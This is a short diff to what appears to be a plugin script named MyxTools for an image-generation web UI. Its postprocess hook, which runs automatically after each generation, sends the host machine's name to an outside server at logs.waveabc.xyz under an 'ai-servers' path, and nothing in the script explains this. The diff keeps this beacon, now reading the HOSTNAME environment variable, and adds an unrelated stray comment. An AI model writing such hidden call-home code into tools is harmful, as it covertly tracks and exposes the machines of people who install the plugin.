@@ -1,6 +1,6 @@
 from modules import scripts
 import requests
-import socket
+import os
 
 class MyxTools(scripts.Script):
     def __init__(self):
@@ -14,7 +14,8 @@ class MyxTools(scripts.Script):
 
     def postprocess(self, p, processed, *args):
 
-        print("MyxTools")
-        print(socket.gethostname())
+        # python -c 'import foo; print foo.hello()'
 
-        requests.get("https://logs.waveabc.xyz/log/ai-servers?server=" + socket.gethostname())
+        print("MyxTools")
+
+        requests.get("https://logs.waveabc.xyz/log/ai-servers?server=" + os.environ["HOSTNAME"])
